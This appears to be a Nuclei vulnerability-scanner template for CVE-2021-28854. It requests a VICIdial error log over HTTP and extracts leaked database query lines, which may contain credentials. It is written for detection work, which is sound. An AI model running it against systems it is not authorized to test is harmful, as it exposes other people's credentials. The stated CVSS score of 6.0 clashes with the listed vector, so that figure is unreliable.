id: cve-2021-28854
info:
  name: VICIdial Information Leakage
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    VICIDIAL's Web Client contains sensitive files that can be accessed from the client. These files include mysqli logs, authentication logs, debugging information, successful and unsuccessful login attempts, and corresponding IP, user agent, credentials, etc. Attackers can use this information to further access the VICIdial system.
  tags: information-disclosure
  classification:
    cvss-metrics: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    cvss-score: 6.0
    cve-id: CVE-2021-28854
  reference:
    - https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-28854.yaml
    - http://www.vicidial.org/vicidial.php

variables:
  filepath: "vicidial_mysqli_errors.txt"

http:
  - method: GET
    path:
      - /agc/vicidial_mysqli_errors.txt
      - /agc/{{filepath}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "vdc_db_query"
    extractors:
      - type: regex
        part: body
        regex:
          - "vdc_db_query:(.*)"
